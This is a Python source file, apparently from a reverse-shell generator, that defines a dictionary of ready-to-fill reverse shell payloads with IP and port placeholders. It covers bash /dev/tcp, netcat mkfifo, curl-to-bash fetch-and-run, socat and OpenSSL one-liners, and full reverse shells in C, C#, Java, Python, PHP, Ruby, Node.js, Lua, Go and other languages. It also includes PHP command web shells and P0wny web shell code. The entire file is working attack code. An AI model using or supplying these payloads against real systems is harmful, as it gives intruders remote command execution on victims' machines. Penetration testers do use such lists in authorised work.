# Linux/Generic Reverse Shell Payloads
# All payloads use {ip} and {port} placeholders
# Using raw strings (r'''...''') for payloads containing backslashes

LINUX_PAYLOADS = {
    "Bash -i": r'''bash -i >& /dev/tcp/{ip}/{port} 0>&1''',
    
    "Bash 196": r'''0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196''',
    
    "Bash read line": r'''exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done''',
    
    "Bash 5": r'''/bin/bash -l > /dev/tcp/{ip}/{port} 0<&1 2>&1''',
    
    "Bash udp": r'''sh -i >& /dev/udp/{ip}/{port} 0>&1''',
    
    "nc mkfifo": r'''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f''',
    
    "nc -e": r'''nc {ip} {port} -e /bin/sh''',
    
    "BusyBox nc -e": r'''busybox nc {ip} {port} -e /bin/sh''',
    
    "nc -c": r'''nc -c /bin/sh {ip} {port}''',
    
    "ncat -e": r'''ncat {ip} {port} -e /bin/sh''',
    
    "ncat udp": r'''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|ncat -u {ip} {port} >/tmp/f''',
    
    "curl": r'''curl -s http://{ip}:{port}/shell.sh | bash''',
    
    "rustcat": r'''rcat connect -s /bin/sh {ip} {port}''',
    
    "C": r'''#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){{
    int port = {port};
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("{ip}");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {{"/bin/sh", NULL}};
    execve("/bin/sh", argv, NULL);

    return 0;       
}}''',
    
    "C# TCP Client": r'''using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;

namespace ConnectBack {{
    public class Program {{
        static StreamWriter streamWriter;

        public static void Main(string[] args) {{
            using(TcpClient client = new TcpClient("{ip}", {port})) {{
                using(Stream stream = client.GetStream()) {{
                    using(StreamReader rdr = new StreamReader(stream)) {{
                        streamWriter = new StreamWriter(stream);
                        
                        StringBuilder strInput = new StringBuilder();

                        Process p = new Process();
                        p.StartInfo.FileName = "/bin/sh";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();

                        while(true) {{
                            strInput.Append(rdr.ReadLine());
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }}
                    }}
                }}
            }}
        }}

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine) {{
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data)) {{
                try {{
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }} catch (Exception err) {{ }}
            }}
        }}
    }}
}}''',
    
    "C# Bash -i": r'''using System;
using System.Diagnostics;

namespace BackConnect {{
    class ReverseBash {{
        public static void Main(string[] args) {{
            Process proc = new System.Diagnostics.Process();
            proc.StartInfo.FileName = "/bin/bash";
            proc.StartInfo.Arguments = "-c \"/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1\"";
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.Start();
        }}
    }}
}}''',
    
    "Haskell #1": r'''module Main where

import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} >/tmp/f"''',
    
    "OpenSSL": r'''mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s''',
    
    "Perl": r'''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' ''',
    
    "Perl no sh": r'''perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' ''',
    
    "Perl PentestMonkey": r'''perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){{if($ENV{{$key}}=~/(.*)/s){{$ENV{{$key}}=$1;}}}}$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){{if($_=~ /(.*)/s){{system $1;}}}};' ''',
    
    "PHP PentestMonkey": r'''php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");' ''',
    
    "PHP Ivan Sincek": r'''php -r '$sock=fsockopen("{ip}",{port});$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);' ''',
    
    "PHP cmd": r'''<?php if(isset($_REQUEST['cmd'])){{ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }}?>''',
    
    "PHP cmd 2": r'''<?php if(isset($_REQUEST['cmd'])){{ $cmd = ($_REQUEST['cmd']); exec($cmd, $output); foreach($output as $line){{ echo $line."<br>"; }} die; }}?>''',
    
    "PHP cmd small": r'''<?=`$_GET[0]`?>''',
    
    "PHP exec": r'''php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");' ''',
    
    "PHP shell_exec": r'''php -r '$sock=fsockopen("{ip}",{port});shell_exec("/bin/sh -i <&3 >&3 2>&3");' ''',
    
    "PHP system": r'''php -r '$sock=fsockopen("{ip}",{port});system("/bin/sh -i <&3 >&3 2>&3");' ''',
    
    "PHP passthru": r'''php -r '$sock=fsockopen("{ip}",{port});passthru("/bin/sh -i <&3 >&3 2>&3");' ''',
    
    "PHP `": r'''php -r '$sock=fsockopen("{ip}",{port});`/bin/sh -i <&3 >&3 2>&3`;' ''',
    
    "PHP popen": r'''php -r '$sock=fsockopen("{ip}",{port});popen("/bin/sh -i <&3 >&3 2>&3", "r");' ''',
    
    "PHP proc_open": r'''php -r '$sock=fsockopen("{ip}",{port});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);' ''',
    
    "P0wny Shell (Webshell)": r'''<?php
$SHELL = getenv("SHELL") ? getenv("SHELL") : "/bin/sh";
function featureShell($cmd, $cwd) {{
    $stdout = array();
    if (preg_match("/^\s*cd\s*(2>&1)?$/", $cmd)) {{
        chdir(getenv("HOME"));
    }} elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {{
        chdir($cwd);
        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        chdir($match[1]);
    }} elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {{
        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        return featureDownload($match[1]);
    }} else {{
        chdir($cwd);
        exec($cmd, $stdout);
    }}
    return array("stdout" => $stdout, "cwd" => getcwd());
}}
echo '<h1>p0wny@shell:~#</h1>';
?>''',
    
    "Python #1": r'''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ''',
    
    "Python #2": r'''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")' ''',
    
    "Python3 #1": r'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ''',
    
    "Python3 #2": r'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")' ''',
    
    "Python3 shortest": r'''python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")' ''',
    
    "Ruby #1": r'''ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''',
    
    "Ruby no sh": r'''ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{ip}","{port}");loop{{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/)? (Dir.chdir($1)):(IO.popen($_,?r){{|io|c.print io.read}})}}' ''',
    
    "socat #1": r'''socat TCP:{ip}:{port} EXEC:/bin/sh''',
    
    "socat #2 (TTY)": r'''socat TCP:{ip}:{port} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane''',
    
    "sqlite3 nc mkfifo": r'''sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f' ''',
    
    "node.js": r'''require('child_process').exec('nc -e /bin/sh {ip} {port}')''',
    
    "node.js #2": r'''(function(){{
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect({port}, "{ip}", function(){{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    }});
    return /a/;
}})();''',
    
    "Java #1": r'''Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/sh -c exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done");
p.waitFor();''',
    
    "Java #2": r'''String host="{ip}";
int port={port};
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}};}};p.destroy();s.close();''',
    
    "Java #3": r'''import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class RevShell {{
    public static void main(String[] args) throws Exception {{
        String host = "{ip}";
        int port = {port};
        String cmd = "/bin/sh";
        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s = new Socket(host, port);
        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
        OutputStream po = p.getOutputStream(), so = s.getOutputStream();
        while (!s.isClosed()) {{
            while (pi.available() > 0)
                so.write(pi.read());
            while (pe.available() > 0)
                so.write(pe.read());
            while (si.available() > 0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {{
                p.exitValue();
                break;
            }} catch (Exception e) {{
            }}
        }}
        p.destroy();
        s.close();
    }}
}}''',
    
    "Java Web": r'''<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {{
    InputStream is;
    OutputStream os;

    StreamConnector( InputStream is, OutputStream os )
    {{
      this.is = is;
      this.os = os;
    }}

    public void run()
    {{
      BufferedReader in  = null;
      BufferedWriter out = null;
      try
      {{
        in  = new BufferedReader( new InputStreamReader( this.is ) );
        out = new BufferedWriter( new OutputStreamWriter( this.os ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )
        {{
          out.write( buffer, 0, length );
          out.flush();
        }}
      }} catch( Exception e ){{}}
      try
      {{
        if( in != null )
          in.close();
        if( out != null )
          out.close();
      }} catch( Exception e ){{}}
    }}
  }}

  try
  {{
    Socket socket = new Socket( "{ip}", {port} );
    Process process = Runtime.getRuntime().exec( "/bin/sh" );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  }} catch( Exception e ) {{}}
%>''',
    
    "Java Two Way": r'''import java.io.*;
import java.net.*;

public class shell {{
    public static void main(String[] args) {{
        String host = "{ip}";
        int port = {port};
        String cmd = "/bin/sh";
        try {{
            Process p = Runtime.getRuntime().exec(cmd);
            Socket s = new Socket(host, port);
            new Thread(() -> {{
                try {{
                    InputStream is = p.getInputStream();
                    OutputStream os = s.getOutputStream();
                    int i;
                    while ((i = is.read()) != -1) os.write(i);
                }} catch (Exception e) {{}}
            }}).start();
            new Thread(() -> {{
                try {{
                    InputStream is = s.getInputStream();
                    OutputStream os = p.getOutputStream();
                    int i;
                    while ((i = is.read()) != -1) os.write(i);
                }} catch (Exception e) {{}}
            }}).start();
        }} catch (Exception e) {{}}
    }}
}}''',
    
    "Javascript": r'''String.fromCharCode(10);var x=new ActiveXObject("WScript.Shell").Exec("/bin/sh");''',
    
    "telnet": r'''TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | /bin/sh 1>$TF''',
    
    "zsh": r'''zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY' ''',
    
    "Lua #1": r'''lua -e "require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"''',
    
    "Lua #2": r'''lua5.1 -e 'local host, port = "{ip}", {port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()' ''',
    
    "Golang": r'''echo 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go''',
    
    "Vlang": r'''echo 'import os' > /tmp/t.v && echo 'import net' >> /tmp/t.v && echo 'fn main() {{ mut sock := net.dial("{ip}", {port}) or {{ return }} os.dup2(sock.sockfd, 0) os.dup2(sock.sockfd, 1) os.dup2(sock.sockfd, 2) os.execve("/bin/sh", []string{{}}, []string{{}}) }}' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v''',
    
    "Awk": r'''awk 'BEGIN {{s = "/inet/tcp/0/{ip}/{port}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}' /dev/null''',
    
    "Dart": r'''import 'dart:io';
import 'dart:convert';

main() {{
  Socket.connect("{ip}", {port}).then((socket) {{
    socket.listen((data) {{
      Process.start('/bin/sh', []).then((Process process) {{
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
            .transform(utf8.decoder)
            .listen((output) {{ socket.write(output); }});
      }});
    }},
    onDone: () {{
      socket.destroy();
    }});
  }});
}}''',
    
    "Crystal (system)": r'''crystal eval 'require "process";require "socket";s=Socket.tcp(Socket::Family::INET);s.connect("{ip}",{port});Process.run("/bin/sh",output:s,input:s,error:s)' ''',
    
    "Crystal (code)": r'''require "socket"
require "process"

s = Socket.tcp(Socket::Family::INET)
s.connect("{ip}", {port})
Process.run("/bin/sh", output: s, input: s, error: s)''',
}
